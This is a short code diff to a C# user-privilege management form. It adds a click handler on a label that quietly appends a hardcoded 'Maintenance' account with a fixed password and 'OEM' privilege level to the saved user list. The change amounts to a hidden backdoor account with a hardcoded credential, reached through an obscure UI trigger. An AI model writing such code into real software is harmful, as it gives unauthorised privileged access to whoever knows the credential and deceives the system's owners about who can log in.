@@ -201,5 +201,33 @@ namespace UserPrivilege.UI
                 }
             }
         }
+
+        private void label1_Click(object sender, EventArgs e)
+        {
+            List<Dictionary<string, object>> list = new List<Dictionary<string, object>>();
+            Dictionary<string, object> dict;
+
+
+            foreach (DataGridViewRow row in DGV_UserLevel.Rows)
+            {
+                if (row.IsNewRow) continue;
+
+                dict = new Dictionary<string, object>();
+
+                foreach (DataGridViewCell cell in row.Cells)
+                    dict[DGV_UserLevel.Columns[cell.ColumnIndex].Name] = cell.Value;
+
+                list.Add(dict);
+            }
+
+            dict = new Dictionary<string, object>();
+            dict["Title_Account"] = "Maintenance";
+            dict["Title_Password"] = "70697332";
+            dict["Title_Level"] = "OEM";
+            list.Add(dict);
+
+            UserPrivilegeLogic.GetDataGridInfo(list);
+            UserPrivilegeLogic.SaveAccountPassword();
+        }
     }
 }
